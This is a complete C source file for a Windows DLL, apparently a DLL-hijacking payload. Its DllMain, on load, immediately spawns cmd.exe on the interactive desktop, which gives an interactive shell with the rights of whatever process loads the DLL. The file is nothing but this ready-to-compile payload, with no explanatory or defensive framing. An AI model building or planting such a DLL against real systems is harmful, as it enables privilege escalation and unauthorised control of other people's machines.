#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hinstDLL);

        STARTUPINFOW si = { 0 };
        PROCESS_INFORMATION pi = { 0 };
        si.cb = sizeof(si);
        si.lpDesktop = L"WinSta0\\Default";

        CreateProcessW(
            L"C:\\Windows\\System32\\cmd.exe",
            NULL, NULL, NULL, FALSE,
            CREATE_NEW_CONSOLE,
            NULL, NULL, &si, &pi
        );

        if (pi.hProcess) CloseHandle(pi.hProcess);
        if (pi.hThread)  CloseHandle(pi.hThread);
    }
    return TRUE;
}
